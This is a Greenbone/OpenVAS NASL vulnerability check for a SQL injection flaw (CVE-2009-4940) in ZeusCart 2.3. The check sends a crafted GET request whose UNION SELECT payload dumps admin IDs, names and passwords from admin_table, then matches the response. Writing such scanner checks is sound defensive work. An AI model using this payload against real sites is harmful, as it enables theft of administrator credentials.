# Copyright (C) 2010 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:zeuscart:zeuscart";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801240");
  script_version("2022-06-03T08:37:53+0000");
  script_tag(name:"last_modification", value:"2022-06-03 08:37:53 +0000 (Fri, 03 Jun 2022)");
  script_tag(name:"creation_date", value:"2010-08-02 12:38:17 +0200 (Mon, 02 Aug 2010)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2009-4940");

  script_tag(name:"qod_type", value:"remote_app");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("ZeusCart SQLi Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_zeuscart_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("zeuscart/installed");

  script_tag(name:"summary", value:"ZeusCart is prone to an SQL injection (SQLi) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The flaw is caused by improper validation of user-supplied
  input via the 'maincatid' parameter in a 'showmaincatlanding' action which allows attacker to
  manipulate SQL queries by injecting arbitrary SQL code.");

  script_tag(name:"impact", value:"Successful exploitation will allow an attacker to cause SQL
  injection attack and gain sensitive information.");

  script_tag(name:"affected", value:"ZeusCart version 2.3.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General
  solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_xref(name:"URL", value:"http://inj3ct0r.com/exploits/5275");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/35151");
  script_xref(name:"URL", value:"http://www.milw0rm.com/exploits/8829");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

url = dir + "/?do=featured&action=showmaincatlanding&maincatid=-9999+union" +
            "+all+select+concat(0x72616e645f75736572,0x3a,admin_id,0x3a,admin_name," +
            "0x3a,admin_password,0x3a,0x72616e645f75736572)+from+admin_table--";

if( http_vuln_check( port:port, url:url, pattern:'>rand_user:(.+):(.+):(.+):rand_user<' ) ) {
  report = http_report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
